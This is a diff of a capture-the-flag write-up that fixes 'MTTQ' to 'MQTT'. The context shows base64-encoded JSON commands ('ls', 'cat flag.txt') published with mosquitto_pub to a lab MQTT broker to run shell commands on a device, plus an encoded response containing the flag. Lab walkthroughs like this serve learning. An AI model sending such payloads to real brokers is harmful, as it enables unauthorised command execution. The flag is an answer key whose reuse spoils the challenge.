@@ -99,7 +99,7 @@ Okay perfect, we used an online decoder and we decrypted it to base64 and we got
 
 ` eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ== `
 
-We can try and maybe walk it through the MTTQ broker?
+We can try and maybe walk it through the MQTT broker?
 
 ` mosquitto_pub -h 10.114.175.47 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m
 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==' `
@@ -111,13 +111,13 @@ Super! We got another hash and that one is a BIG CLUE:
 We literally see a text file with the flag in the response section, all we need to do now is to
 get inside of it.
 
-Before that - we have to decode this one into base64 again and maybe run in through the MTTQ Broker again.
+Before that - we have to decode this one into base64 again and maybe run in through the MQTT Broker again.
 
 After decoding we get:
 
 ` eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0= `
 
-and after MTTQ Broker we finally get:
+and after MQTT Broker we finally get:
 
 ` eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 `
 
